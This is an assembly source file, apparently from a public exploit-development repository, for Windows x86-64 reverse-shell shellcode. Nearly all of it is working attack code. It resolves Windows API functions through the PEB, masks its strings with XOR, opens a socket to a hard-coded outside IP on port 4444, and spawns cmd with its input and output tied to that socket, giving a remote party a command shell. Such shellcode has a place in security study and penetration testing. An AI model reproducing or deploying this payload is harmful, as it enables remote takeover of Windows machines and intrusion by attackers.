; Windows x86_64 64 bits shellcode reverse shelll
; not contains: 0x00, 0x0A, 0x0D

; rm -rf reverse_shell*
; nasm.exe -f win32 reverse_asm.asm -o reverse_shell.o
; ld -mi386pe reverse_shell.o -o reverse_shell32.exe

; MIT License - Copyright 2020
; David Reguera Garcia aka Dreg - dreg@fr33project.org
; -
; http://github.com/David-Reguera-Garcia-Dreg/ - http://www.fr33project.org/
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
; The above copyright notice and this permission notice shall be included in
; all copies or substantial portions of the Software.
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
; FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
; IN THE SOFTWARE.
;
; WARNING: The crappiest shellcode asm in the world

; Based from: 
; https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/
;
; WARNING: The crappiest shellcode asm in the world


[BITS 64]

global WinMain

section .text
WinMain:

sub rsp, 0x30                          
and rsp, 0xFFFFFFFFFFFFFFF0                
or rsp, 8                                

loopez:

xor rcx, rcx             ; RCX = 0
mov rax, [gs:rcx + 0x60] ; RAX = PEB
mov rax, [rax + 0x18]    ; RAX = PEB->Ldr
mov rsi, [rax + 0x20]    ; RSI = PEB->Ldr.InMemOrder
lodsq                    ; RAX = Second module
xchg rax, rsi            ; RAX = RSI, RSI = RAX
lodsq                    ; RAX = Third(kernel32)
mov rbx, [rax + 0x20]    ; RBX = Base address

; Parse kernel32 PE

xor r8, r8                 ; Clear r8
mov r8d, [rbx + 0x3c]      ; R8D = DOS->e_lfanew offset
mov rdx, r8                ; RDX = DOS->e_lfanew
add rdx, rbx               ; RDX = PE Header
mov r10, 0xFFFFFFFFFFFFFF77
not r10
mov r8d, [rdx + r10]      ; R8D = Offset export table
add r8, rbx                ; R8 = Export table
xor rsi, rsi               ; Clear RSI
mov esi, [r8 + 0x20]       ; RSI = Offset namestable
add rsi, rbx               ; RSI = Names table
xor rcx, rcx               ; RCX = 0
mov r9, 0x41636f7250746547 ; GetProcA

; Loop through exported functions and find GetProcAddress

Get_Function:

inc rcx                    ; Increment the ordinal
xor rax, rax               ; RAX = 0
mov eax, [rsi + rcx * 4]   ; Get name offset
add rax, rbx               ; Get function name
cmp QWORD [rax], r9        ; GetProcA ?
jnz Get_Function
xor rsi, rsi               ; RSI = 0
mov esi, [r8 + 0x24]       ; ESI = Offset ordinals
add rsi, rbx               ; RSI = Ordinals table
mov cx, [rsi + rcx * 2]    ; Number of function
xor rsi, rsi               ; RSI = 0
mov esi, [r8 + 0x1c]       ; Offset address table
add rsi, rbx               ; ESI = Address table
xor rdx, rdx               ; RDX = 0
mov edx, [rsi + rcx * 4]   ; EDX = Pointer(offset)
add rdx, rbx               ; RDX = GetProcAddress
mov rdi, rdx               ; Save GetProcAddress in RDI

mov rax, rbx
mov rsi, rbx

; rdi GetProcAddress address
; rax, rsi, rbx kernel32.dll base address

; push LoadLibraryA,0
mov r13, rsp
xor rbx, rbx
push rbx
mov rbx, 0x417972617262694C
push rbx
push 0x64616F4C
shl qword [rsp], 0x20
push rsp
add qword [rsp], 4
pop rdx
mov rcx, rax
sub rsp, 0x28                 
and rsp, 0FFFFFFFFFFFFFFF0h   
call rdi
mov rsp, r13
mov r12, rax
; r12 LoadLibraryA address
; rdi GetProcAddress address
; rsi kernel32.dll base address

; push  ExitProcess, 0
mov r13, rsp
mov rbx, 0x69737365636F7250
push rbx
xor byte [rsp+7], 0x69
push 0x74697845
shl qword [rsp], 0x20
push rsp
add qword [rsp], 4
pop rdx
mov rcx, rsi
sub rsp, 0x28                 
and rsp, 0FFFFFFFFFFFFFFF0h   
call rdi
mov rsp, r13
mov r14, rax
; r14 ExitProcess address
; r12 LoadLibraryA address
; rdi GetProcAddress address
; rsi kernel32.dll base address

; push ws2_32.dll, 0
mov r13, rsp
mov rbx, 0x69696c6c642e3233
push rbx
xor word [rsp+6], 0x6969
push 0x5f327377
shl qword [rsp], 0x20
push rsp
add qword [rsp], 4
pop rcx
sub rsp, 0x28                 
and rsp, 0FFFFFFFFFFFFFFF0h   
call r12
mov rsp, r13
mov r15, rax
; r15 ws2_32.dll base address
; r14 ExitProcess address
; r12 LoadLibraryA address
; rdi GetProcAddress address
; rsi kernel32.dll base address

; push  WSAStartup, 0
mov r13, rsp
mov rbx, 0x6969707574726174
push rbx
xor word [rsp+6], 0x6969
push 0x53415357
shl qword [rsp], 0x20
push rsp
add qword [rsp], 4
pop rdx
mov rcx, r15
sub rsp, 0x28                 
and rsp, 0FFFFFFFFFFFFFFF0h   
call rdi
mov rsp, r13

mov r13, rsp
xor edx, edx
mov dx, 0x0202
sub rsp, rdx
sub rsp, rdx
mov rcx, rsp
xchg rcx, rdx
sub rsp, 0x28                 
and rsp, 0FFFFFFFFFFFFFFF0h  
call rax
mov rsp, r13


; push  WSASocketA, 0
mov r13, rsp
mov rbx, 0x69694174656b636f
push rbx
xor word [rsp+6], 0x6969
push 0x53415357
shl qword [rsp], 0x20
push rsp
add qword [rsp], 4
pop rdx
mov rcx, r15
sub rsp, 0x28                 
and rsp, 0FFFFFFFFFFFFFFF0h   
call rdi
mov rsp, r13

mov r13, rsp
push 6
push 1
push 2

pop rcx
pop rdx
pop r8

xor r9,r9
push r9
push r9
sub rsp, 0x28                 
and rsp, 0FFFFFFFFFFFFFFF0h  
call rax
mov rsp, r13
mov rbx, rax
; rbx socket_handle
; r15 ws2_32.dll base address
; r14 ExitProcess address
; r12 LoadLibraryA address
; rdi GetProcAddress address
; rsi kernel32.dll base address

; push connect, 0
push rbx
mov r13, rsp
mov rbx, 0x697463656e6e6f63
push rbx
xor byte [rsp+7], 0x69
mov rdx, rsp
mov rcx, r15
sub rsp, 0x28                 
and rsp, 0FFFFFFFFFFFFFFF0h   
call rdi
mov rsp, r13


; dreg@fr33project:~# ./genipport.sh
; ip: 51.195.45.136
; port: 4444
; converting IP....
; converting: 33C32D88
; endian: 882DC333
; IP converted: 77D23CCC
; converting PORT....
; converting: 115C
; endian: 5C11
; port converted: A3EE
mov r13, rsp
mov ebx, 0x77D23CCC  ; IP
xor ebx, 0xffffffff
shl rbx, 0x8*2
push -1
push word 0xA3EE ; PORT
not qword [rsp]
add rbx, [rsp]
shl rbx, 0x10
mov bl, 0x02
mov rsp, r13
mov rcx, rbx
;mov rbx, 0x882DC3335C110002
pop rcx
mov r13, rsp
push rbx
mov rbx, rcx
mov rdx, rsp
push 0x10
pop r8
sub rsp, 0x28                 
and rsp, 0FFFFFFFFFFFFFFF0h   
call rax
mov rsp, r13

; push connect, 0
push rbx
mov r13, rsp
mov rbx, 0x696941737365636f 
push rbx
xor word [rsp + 0x6], 0x6969
mov rbx, 0x7250657461657243 
push rbx
mov rcx, rsi
mov rdx, rsp
sub rsp, 0x28                 
and rsp, 0FFFFFFFFFFFFFFF0h   
call rdi
mov rsp, r13
mov r12, rax
pop rbx

mov r13, rsp
; push cmd, 0
push 0x69
push 0x69
push 0x69646d63                      
xor dword [rsp + 0x3], 0x69   

xor rcx, rcx
xor r9, r9
mov r8, rsp
push r8
push r8
push r8
push r8
mov r8, rsp

push 0x69
push 0x69
push 0x69
push 0x69
push 0x69
push rbx                                
push rbx                                
push rbx                                
push r9                                 
push r9                                 
mov rcx, 0xFFFFFEFFFFFFFFFF
push rcx
not qword [rsp]
push r9 
push r9 
push r9 
push r9 
push r9 
push r9 
push 0x68
push r8
push rsp
add qword [rsp], 0x8

xor rcx, rcx
mov rdx, [rsp+8]
mov rdx, [rdx]
  
xor r8, r8
xor r9, r9

push r9
push r9
push r9
push r9
inc qword [rsp]

sub rsp, 8*4               
call rax
mov rsp, r13


jmp loopez

call r14 ; exit

nop
db 0xCC





